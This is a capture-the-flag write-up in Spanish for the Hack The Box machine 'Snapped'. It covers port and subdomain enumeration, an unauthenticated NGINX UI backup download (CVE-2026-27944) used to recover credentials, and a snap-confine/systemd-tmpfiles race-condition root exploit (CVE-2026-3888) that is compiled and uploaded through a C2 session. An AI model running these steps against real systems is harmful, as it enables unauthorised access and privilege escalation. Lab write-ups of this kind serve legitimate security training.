Máquina Snapped Link to heading

Dificultad: Difícil

Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root.

Comenzamos verificando conectividad y latencia base contra la IP objetivo:

$ ping -c1 10.129.67.215
PING 10.129.67.215 (10.129.67.215) 56(84) bytes of data.

El host responde correctamente. Procedemos con un escaneo completo de puertos TCP y, a continuación, enumeración de servicios en los puertos abiertos:

$ nmap -p- --open -sS --min-rate 5000 snapped.htb -oG nmap/allPorts

Identificamos únicamente dos puertos abiertos: 22/tcp (ssh) y 80/tcp (http). Ejecutamos un escaneo dirigido con scripts y detección de versiones:

$ nmap -p22,80 -sCV -Pn -n snapped.htb -oN nmap/targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

Fingerprinting de tecnologías sobre el servicio HTTP:

$ whatweb http://10.129.67.215
http://10.129.67.215 [302 Found] Country[RESERVED][ZZ], 
HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.67.215], 
RedirectLocation[http://snapped.htb/], Title[302 Found], nginx[1.24.0]

El servidor redirige a http://snapped.htb/, por lo que debemos resolver el dominio localmente. Añadimos la entrada en nuestro /etc/hosts:

# echo -e '# Snapped HTB/n10.129.67.215/tsnapped.htb admin.snapped.htb' >> /etc/hosts

Enumeramos subdominios contra snapped.htb:

$ ffuf -c -u 'http://snapped.htb' -H 'Host: FUZZ.snapped.htb' /
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt /
  -t 20 -r -fs 20199

Descubrimos el subdominio admin con respuesta 200 y tamaño 1407 bytes — un vhost válido. Pasamos a fuzzing de directorios en admin.snapped.htb:

$ ffuf -c -u 'http://admin.snapped.htb/FUZZ' /
  -w /usr/share/seclists/Discovery/Web-Content/common.txt /
  -t 50 -r -e .php,.txt,.zip

Entre los recursos relevantes encontramos index.html (200), robots.txt (200), mcp (403) y version.json (200). Consultamos la versión expuesta:

$ curl http://admin.snapped.htb/version.json
{"version":"2.3.2","build_id":1,"total_build":512}

La versión 2.3.2 corresponde a NGINX UI y es vulnerable a CVE-2026-27944 (descarga de backup sin autenticación con divulgación de clave de cifrado en cabeceras HTTP).

Explotación inicial — CVE-2026-27944 Link to heading

La aplicación expone un endpoint que permite descargar backups del sistema sin autenticación. El backup llega cifrado, pero la clave y el IV se revelan en las cabeceras de respuesta durante la descarga. Usamos el PoC público:

$ python cve-2026-27944.py --target http://admin.snapped.htb:80 /
  --out backup.bin --decrypt

Escalada de privilegios — CVE-2026-3888 Link to heading

Una vez dentro, enumeramos binarios SUID:

$ find / -perm -4000 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine

Destaca un binario SUID poco habitual: snap-confine (snapd 2.63). Revisamos timers del sistema:

$ systemctl list-timers
systemd-tmpfiles-clean.timer → systemd-tmpfiles-clean.service (activo / recurrente)

Y los snaps instalados:

$ snap list
Name     Version     Rev    Tracking         Publisher
bare     1.0         5      latest/stable    canonical✓
core22   20240731    1564   latest/stable    canonical✓
firefox  129.0.2-1   4793   latest/stable/…  mozilla✓
snapd    2.63        21759  latest/stable    canonical✓

La combinación de snap-confine (v2.63) y systemd-tmpfiles es vulnerable a una condición de carrera TOCTOU: permite envenenar el mount namespace e inyectar un objeto compartido ld-linux malicioso, ejecutando código arbitrario como root.

Compilamos el exploit en nuestra máquina atacante:

$ gcc -O2 -static -o exploit exploit_suid.c
$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

Subimos los binarios al objetivo mediante la sesión C2 (Penelope SSH):

upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/exploit
upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/librootshell.so

Ejecutamos:

$ ./exploit librootshell.so
